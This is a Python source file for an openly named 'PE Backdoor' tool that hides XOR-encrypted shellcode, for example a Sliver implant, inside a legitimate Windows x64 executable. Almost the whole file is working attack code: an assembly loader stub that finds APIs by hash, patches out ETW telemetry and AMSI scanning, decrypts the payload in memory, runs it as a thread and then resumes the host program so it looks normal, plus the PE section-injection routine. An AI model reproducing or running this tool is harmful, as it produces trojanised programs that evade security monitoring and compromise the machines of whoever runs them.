"""
PE Backdoor — Inject encrypted payload into a legitimate PE executable.

The backdoored PE runs a mini-loader stub as a thread inside the host process:
1. Patches ETW (silence telemetry)
2. Patches AMSI (bypass scanning)
3. Decrypts payload in memory (XOR + entropy de-interleave)
4. Executes payload as thread
5. Jumps to original entry point — host app runs normally

No files dropped to disk. All in-memory.
Requires gcc for assembling the stub.
"""

import struct
import os
import subprocess
import tempfile


SECTION_NAME = b".text0\x00\x00"
SECTION_CHARACTERISTICS = 0x60000020  # MEM_READ | MEM_EXECUTE | CNT_CODE


def align(value, alignment):
    return (value + alignment - 1) & ~(alignment - 1)


def djb2(s):
    h = 5381
    for c in s:
        h = ((h * 33) + ord(c)) & 0xFFFFFFFF
    return h


def build_stub(payload_rva, payload_enc_size, payload_real_size,
               entropy_reduced, oep_rva, xor_key, gcc_path):
    """
    Build position-independent x64 stub in assembly.
    Uses subroutines for clean code.
    """
    key_bytes = ', '.join([f'0x{b:02X}' for b in xor_key])
    key_len = len(xor_key)

    h_kernel32 = djb2("kernel32.dll")
    h_ntdll = djb2("ntdll.dll")
    h_VirtualAlloc = djb2("VirtualAlloc")
    h_VirtualProtect = djb2("VirtualProtect")
    h_CreateThread = djb2("CreateThread")
    h_GetModuleHandleA = djb2("GetModuleHandleA")
    h_GetProcAddress = djb2("GetProcAddress")
    h_EtwEventWrite = djb2("EtwEventWrite")

    asm = f"""
.intel_syntax noprefix
.text
.global _start

_start:
    push rbx
    push rbp
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 0x100

    # r15 = image base (ASLR-safe)
    mov rax, gs:[0x60]
    mov r15, [rax + 0x10]

    # ---- Find kernel32.dll ----
    mov ecx, {h_kernel32}
    call find_module
    test rax, rax
    jz go_oep
    mov rbx, rax                # rbx = kernel32 base

    # ---- Resolve APIs from kernel32 ----
    # VirtualAlloc
    mov rcx, rbx
    mov edx, {h_VirtualAlloc}
    call find_export
    mov [rsp+0x80], rax         # [rsp+0x80] = VirtualAlloc

    # VirtualProtect
    mov rcx, rbx
    mov edx, {h_VirtualProtect}
    call find_export
    mov [rsp+0x88], rax         # [rsp+0x88] = VirtualProtect

    # CreateThread
    mov rcx, rbx
    mov edx, {h_CreateThread}
    call find_export
    mov [rsp+0x90], rax         # [rsp+0x90] = CreateThread

    # GetModuleHandleA
    mov rcx, rbx
    mov edx, {h_GetModuleHandleA}
    call find_export
    mov [rsp+0x98], rax         # [rsp+0x98] = GetModuleHandleA

    # GetProcAddress
    mov rcx, rbx
    mov edx, {h_GetProcAddress}
    call find_export
    mov [rsp+0xA0], rax         # [rsp+0xA0] = GetProcAddress

    # Check critical APIs resolved
    cmp qword ptr [rsp+0x80], 0
    je go_oep
    cmp qword ptr [rsp+0x90], 0
    je go_oep

    # ---- Patch ETW ----
    # Build "ntdll.dll" on stack
    mov byte ptr [rsp], 'n'
    mov byte ptr [rsp+1], 't'
    mov byte ptr [rsp+2], 'd'
    mov byte ptr [rsp+3], 'l'
    mov byte ptr [rsp+4], 'l'
    mov byte ptr [rsp+5], '.'
    mov byte ptr [rsp+6], 'd'
    mov byte ptr [rsp+7], 'l'
    mov byte ptr [rsp+8], 'l'
    mov byte ptr [rsp+9], 0

    lea rcx, [rsp]
    sub rsp, 0x20
    call qword ptr [rsp+0x98+0x20]   # GetModuleHandleA("ntdll.dll")
    add rsp, 0x20
    test rax, rax
    jz skip_etw

    # Build "EtwEventWrite" on stack
    mov byte ptr [rsp], 'E'
    mov byte ptr [rsp+1], 't'
    mov byte ptr [rsp+2], 'w'
    mov byte ptr [rsp+3], 'E'
    mov byte ptr [rsp+4], 'v'
    mov byte ptr [rsp+5], 'e'
    mov byte ptr [rsp+6], 'n'
    mov byte ptr [rsp+7], 't'
    mov byte ptr [rsp+8], 'W'
    mov byte ptr [rsp+9], 'r'
    mov byte ptr [rsp+10], 'i'
    mov byte ptr [rsp+11], 't'
    mov byte ptr [rsp+12], 'e'
    mov byte ptr [rsp+13], 0

    mov rcx, rax
    lea rdx, [rsp]
    sub rsp, 0x20
    call qword ptr [rsp+0xA0+0x20]   # GetProcAddress(ntdll, "EtwEventWrite")
    add rsp, 0x20
    test rax, rax
    jz skip_etw

    # VirtualProtect(etw, 4, PAGE_EXECUTE_READWRITE, &old)
    mov r12, rax                # save ETW addr
    lea r9, [rsp+0x70]          # &old
    mov r8d, 0x40               # PAGE_EXECUTE_READWRITE
    mov edx, 4
    mov rcx, rax
    sub rsp, 0x20
    call qword ptr [rsp+0x88+0x20]
    add rsp, 0x20

    # Patch: xor eax,eax; ret
    mov byte ptr [r12], 0x33
    mov byte ptr [r12+1], 0xC0
    mov byte ptr [r12+2], 0xC3

    # Restore protection
    lea r9, [rsp+0x70]
    mov r8d, [rsp+0x70]
    mov edx, 4
    mov rcx, r12
    sub rsp, 0x20
    call qword ptr [rsp+0x88+0x20]
    add rsp, 0x20

skip_etw:

    # ---- Patch AMSI (only if loaded) ----
    mov byte ptr [rsp], 'a'
    mov byte ptr [rsp+1], 'm'
    mov byte ptr [rsp+2], 's'
    mov byte ptr [rsp+3], 'i'
    mov byte ptr [rsp+4], '.'
    mov byte ptr [rsp+5], 'd'
    mov byte ptr [rsp+6], 'l'
    mov byte ptr [rsp+7], 'l'
    mov byte ptr [rsp+8], 0

    lea rcx, [rsp]
    sub rsp, 0x20
    call qword ptr [rsp+0x98+0x20]
    add rsp, 0x20
    test rax, rax
    jz skip_amsi

    mov byte ptr [rsp], 'A'
    mov byte ptr [rsp+1], 'm'
    mov byte ptr [rsp+2], 's'
    mov byte ptr [rsp+3], 'i'
    mov byte ptr [rsp+4], 'S'
    mov byte ptr [rsp+5], 'c'
    mov byte ptr [rsp+6], 'a'
    mov byte ptr [rsp+7], 'n'
    mov byte ptr [rsp+8], 'B'
    mov byte ptr [rsp+9], 'u'
    mov byte ptr [rsp+10], 'f'
    mov byte ptr [rsp+11], 'f'
    mov byte ptr [rsp+12], 'e'
    mov byte ptr [rsp+13], 'r'
    mov byte ptr [rsp+14], 0

    mov rcx, rax
    lea rdx, [rsp]
    sub rsp, 0x20
    call qword ptr [rsp+0xA0+0x20]
    add rsp, 0x20
    test rax, rax
    jz skip_amsi

    mov r12, rax
    lea r9, [rsp+0x70]
    mov r8d, 0x40
    mov edx, 8
    mov rcx, rax
    sub rsp, 0x20
    call qword ptr [rsp+0x88+0x20]
    add rsp, 0x20

    # Patch: mov eax, 0x80070057; ret
    mov byte ptr [r12], 0xB8
    mov byte ptr [r12+1], 0x57
    mov byte ptr [r12+2], 0x00
    mov byte ptr [r12+3], 0x07
    mov byte ptr [r12+4], 0x80
    mov byte ptr [r12+5], 0xC3

    lea r9, [rsp+0x70]
    mov r8d, [rsp+0x70]
    mov edx, 8
    mov rcx, r12
    sub rsp, 0x20
    call qword ptr [rsp+0x88+0x20]
    add rsp, 0x20

skip_amsi:

    # ---- Allocate memory for decrypted payload ----
    xor r9d, r9d
    mov r9d, 0x04               # PAGE_READWRITE
    mov r8d, 0x3000             # MEM_COMMIT | MEM_RESERVE
    mov edx, {payload_real_size}
    xor rcx, rcx
    sub rsp, 0x20
    call qword ptr [rsp+0x80+0x20]   # VirtualAlloc
    add rsp, 0x20
    test rax, rax
    jz go_oep
    mov r13, rax                # r13 = allocated buffer

    # ---- Copy + decrypt payload ----
    lea rsi, [r15 + {payload_rva}]   # source = image_base + payload_rva

    {"" if not entropy_reduced else f'''
    # De-interleave: take every other byte
    xor ecx, ecx
deinterleave:
    cmp ecx, {payload_real_size}
    jge decrypt
    movzx eax, byte ptr [rsi]
    mov byte ptr [r13 + rcx], al
    add rsi, 2
    inc ecx
    jmp deinterleave
decrypt:
    '''}

    {"" if entropy_reduced else f'''
    # Direct copy
    lea rdi, [r13]
    mov ecx, {payload_enc_size}
copy_loop:
    dec ecx
    js decrypt
    movzx eax, byte ptr [rsi + rcx]
    mov byte ptr [rdi + rcx], al
    jmp copy_loop
decrypt:
    '''}

    # XOR decrypt with key
    xor ecx, ecx
    lea rdi, [rip + xor_key]
xor_loop:
    cmp ecx, {payload_real_size}
    jge xor_done
    mov eax, ecx
    xor edx, edx
    mov r8d, {key_len}
    div r8d                     # edx = ecx % key_len
    movzx eax, byte ptr [rdi + rdx]
    xor byte ptr [r13 + rcx], al
    inc ecx
    jmp xor_loop
xor_done:

    # ---- VirtualProtect to PAGE_EXECUTE_READ ----
    lea r9, [rsp+0x70]
    mov r8d, 0x20               # PAGE_EXECUTE_READ
    mov edx, {payload_real_size}
    mov rcx, r13
    sub rsp, 0x20
    call qword ptr [rsp+0x88+0x20]
    add rsp, 0x20

    # ---- CreateThread ----
    xor rcx, rcx                # lpThreadAttributes
    xor rdx, rdx                # dwStackSize
    mov r8, r13                 # lpStartAddress = decrypted shellcode
    xor r9, r9                  # lpParameter
    push 0                      # lpThreadId
    push 0                      # dwCreationFlags
    sub rsp, 0x20
    call qword ptr [rsp+0x90+0x30]
    add rsp, 0x30

go_oep:
    add rsp, 0x100
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbp
    pop rbx

    # Jump to OEP
    mov rax, gs:[0x60]
    mov rax, [rax + 0x10]
    add rax, {oep_rva}
    jmp rax

# ---- Subroutine: find_module by name hash ----
# Input:  ecx = djb2 hash of lowercase module name
# Output: rax = module base (or 0)
find_module:
    push rbx
    push rsi
    push rdi
    push rbp
    mov ebp, ecx                # save target hash

    mov rax, gs:[0x60]
    mov rax, [rax + 0x18]       # Ldr
    lea rsi, [rax + 0x20]       # &InMemoryOrderModuleList (head)
    mov rbx, [rsi]              # first entry Flink

fm_loop:
    lea rax, [rsi]
    cmp rbx, rax
    je fm_notfound

    mov rdi, [rbx + 0x50]       # BaseDllName.Buffer
    test rdi, rdi
    jz fm_next

    # djb2 hash of wide string (lowercase)
    mov edx, 5381
fm_hash:
    movzx eax, byte ptr [rdi]
    test al, al
    jz fm_cmp
    cmp al, 0x41
    jb fm_nolower
    cmp al, 0x5A
    ja fm_nolower
    add al, 0x20
fm_nolower:
    imul edx, edx, 33
    add edx, eax
    add rdi, 2
    jmp fm_hash

fm_cmp:
    cmp edx, ebp
    je fm_found

fm_next:
    mov rbx, [rbx]              # Flink
    jmp fm_loop

fm_found:
    mov rax, [rbx + 0x20]       # DllBase
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    ret

fm_notfound:
    xor eax, eax
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    ret

# ---- Subroutine: find_export by hash ----
# Input:  rcx = module base, edx = djb2 hash of function name
# Output: rax = function address (or 0)
find_export:
    push rbx
    push rsi
    push rdi
    push rbp
    push r12
    mov rbx, rcx                # module base
    mov ebp, edx                # target hash

    mov eax, [rbx + 0x3C]       # e_lfanew
    lea rdi, [rbx + rax]        # NT headers
    mov eax, [rdi + 0x88]       # Export Dir RVA
    test eax, eax
    jz fe_notfound
    lea r12, [rbx + rax]        # Export Directory

    mov ecx, [r12 + 0x18]       # NumberOfNames
    test ecx, ecx
    jz fe_notfound
    mov eax, [r12 + 0x20]       # AddressOfNames RVA
    lea rsi, [rbx + rax]        # names array

fe_loop:
    dec ecx
    js fe_notfound

    mov eax, [rsi + rcx*4]
    lea rdi, [rbx + rax]        # function name

    # djb2 hash
    mov edx, 5381
fe_hash:
    movzx eax, byte ptr [rdi]
    test al, al
    jz fe_cmp
    imul edx, edx, 33
    add edx, eax
    inc rdi
    jmp fe_hash

fe_cmp:
    cmp edx, ebp
    jne fe_loop

    # Found
    mov eax, [r12 + 0x24]       # AddressOfNameOrdinals RVA
    lea rdi, [rbx + rax]
    movzx ecx, word ptr [rdi + rcx*2]
    mov eax, [r12 + 0x1C]       # AddressOfFunctions RVA
    lea rdi, [rbx + rax]
    mov eax, [rdi + rcx*4]
    lea rax, [rbx + rax]

    pop r12
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    ret

fe_notfound:
    xor eax, eax
    pop r12
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    ret

# ---- XOR key data ----
xor_key:
    .byte {key_bytes}
"""

    with tempfile.TemporaryDirectory() as tmpdir:
        asm_path = os.path.join(tmpdir, "stub.s")
        obj_path = os.path.join(tmpdir, "stub.o")
        bin_path = os.path.join(tmpdir, "stub.bin")

        with open(asm_path, "w") as f:
            f.write(asm)

        gcc_dir = os.path.dirname(gcc_path)
        env = os.environ.copy()
        env["PATH"] = gcc_dir + ";" + env.get("PATH", "")

        result = subprocess.run(
            [gcc_path, "-c", "-nostdlib", "-o", obj_path, asm_path],
            capture_output=True, text=True, env=env
        )
        if result.returncode != 0:
            raise RuntimeError(f"Assembly failed: {result.stderr}")

        objcopy = os.path.join(gcc_dir, "objcopy.exe")
        if not os.path.isfile(objcopy):
            objcopy = "objcopy"

        result = subprocess.run(
            [objcopy, "-O", "binary", "-j", ".text", obj_path, bin_path],
            capture_output=True, text=True, env=env
        )
        if result.returncode != 0:
            raise RuntimeError(f"objcopy failed: {result.stderr}")

        with open(bin_path, "rb") as f:
            return f.read()


def backdoor_pe(target_path, payload_path, output_path, gcc_path=None,
                xor_key=b'\x4D\x61\x6C\x44\x65\x76',
                entropy_reduced=True):
    """
    Inject encrypted payload into a PE64 executable.
    Payload is XOR encrypted + entropy-interleaved in the PE section.
    The stub decrypts in memory and executes as thread.

    payload_path: raw shellcode (e.g. payload_raw.bin from Sliver)
    """
    if gcc_path is None:
        return False, "GCC path required"

    with open(target_path, "rb") as f:
        pe_data = bytearray(f.read())

    with open(payload_path, "rb") as f:
        raw_payload = f.read()

    if pe_data[:2] != b"MZ":
        return False, "Not a valid PE file"

    e_lfanew = struct.unpack_from("<I", pe_data, 0x3C)[0]
    if pe_data[e_lfanew:e_lfanew+4] != b"PE\x00\x00":
        return False, "Invalid PE signature"

    coff_offset = e_lfanew + 4
    machine = struct.unpack_from("<H", pe_data, coff_offset)[0]
    if machine != 0x8664:
        return False, "Only x64 PE supported"

    num_sections = struct.unpack_from("<H", pe_data, coff_offset + 2)[0]
    optional_hdr_size = struct.unpack_from("<H", pe_data, coff_offset + 16)[0]
    optional_offset = coff_offset + 20

    magic = struct.unpack_from("<H", pe_data, optional_offset)[0]
    if magic != 0x20B:
        return False, "Not PE32+"

    oep_rva = struct.unpack_from("<I", pe_data, optional_offset + 16)[0]
    image_base = struct.unpack_from("<Q", pe_data, optional_offset + 24)[0]
    section_align = struct.unpack_from("<I", pe_data, optional_offset + 32)[0]
    file_align = struct.unpack_from("<I", pe_data, optional_offset + 36)[0]
    size_of_headers = struct.unpack_from("<I", pe_data, optional_offset + 60)[0]

    sections_offset = optional_offset + optional_hdr_size

    last_sect_off = sections_offset + (num_sections - 1) * 40
    last_va = struct.unpack_from("<I", pe_data, last_sect_off + 12)[0]
    last_vsize = struct.unpack_from("<I", pe_data, last_sect_off + 8)[0]
    last_rawsize = struct.unpack_from("<I", pe_data, last_sect_off + 16)[0]
    last_rawptr = struct.unpack_from("<I", pe_data, last_sect_off + 20)[0]

    new_hdr_off = sections_offset + num_sections * 40
    if new_hdr_off + 40 > size_of_headers:
        return False, "No space for section header"

    new_rva = align(last_va + last_vsize, section_align)
    new_raw_off = align(last_rawptr + last_rawsize, file_align)

    # Encrypt payload: XOR then entropy-interleave
    payload_real_size = len(raw_payload)
    encrypted = bytearray(raw_payload)
    for i in range(len(encrypted)):
        encrypted[i] ^= xor_key[i % len(xor_key)]

    if entropy_reduced:
        interleaved = bytearray()
        for b in encrypted:
            interleaved.append(b)
            interleaved.append(0x00)
        enc_data = bytes(interleaved)
        enc_size = len(interleaved)
    else:
        enc_data = bytes(encrypted)
        enc_size = len(encrypted)

    # Layout: [stub padding | encrypted payload]
    stub_pad = 2048
    payload_rva = new_rva + stub_pad

    try:
        stub = build_stub(payload_rva, enc_size, payload_real_size,
                          entropy_reduced, oep_rva, xor_key, gcc_path)
    except RuntimeError as e:
        return False, str(e)

    if len(stub) > stub_pad:
        stub_pad = align(len(stub) + 64, 256)
        payload_rva = new_rva + stub_pad
        stub = build_stub(payload_rva, enc_size, payload_real_size,
                          entropy_reduced, oep_rva, xor_key, gcc_path)

    stub_padded = stub + b"\x90" * (stub_pad - len(stub))
    section_content = stub_padded + enc_data
    section_raw_size = align(len(section_content), file_align)
    section_vsize = align(len(section_content), section_align)
    section_content += b"\x00" * (section_raw_size - len(section_content))

    # Section header
    hdr = bytearray(40)
    hdr[0:8] = SECTION_NAME
    struct.pack_into("<I", hdr, 8, section_vsize)
    struct.pack_into("<I", hdr, 12, new_rva)
    struct.pack_into("<I", hdr, 16, section_raw_size)
    struct.pack_into("<I", hdr, 20, new_raw_off)
    struct.pack_into("<I", hdr, 36, SECTION_CHARACTERISTICS)

    pe_data[new_hdr_off:new_hdr_off+40] = hdr
    struct.pack_into("<H", pe_data, coff_offset + 2, num_sections + 1)
    struct.pack_into("<I", pe_data, optional_offset + 16, new_rva)
    struct.pack_into("<I", pe_data, optional_offset + 56,
                     align(new_rva + section_vsize, section_align))

    if len(pe_data) < new_raw_off:
        pe_data += b"\x00" * (new_raw_off - len(pe_data))

    if len(pe_data) <= new_raw_off:
        pe_data += section_content
    else:
        pe_data = pe_data[:new_raw_off] + section_content

    with open(output_path, "wb") as f:
        f.write(pe_data)

    return True, (
        f"Backdoored PE: {output_path}\n"
        f"Payload: {payload_real_size} bytes (encrypted: {enc_size})\n"
        f"Entropy reduced: {entropy_reduced}\n"
        f"Section .extra at RVA 0x{new_rva:X}\n"
        f"OEP: 0x{oep_rva:X} → stub at 0x{new_rva:X}"
    )


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target.exe> <payload_raw.bin> <output.exe>")
        sys.exit(1)

    from gui_builder import find_gcc
    gcc = find_gcc()
    if not gcc:
        print("GCC not found")
        sys.exit(1)

    ok, msg = backdoor_pe(sys.argv[1], sys.argv[2], sys.argv[3], gcc_path=gcc)
    print(msg)
    sys.exit(0 if ok else 1)
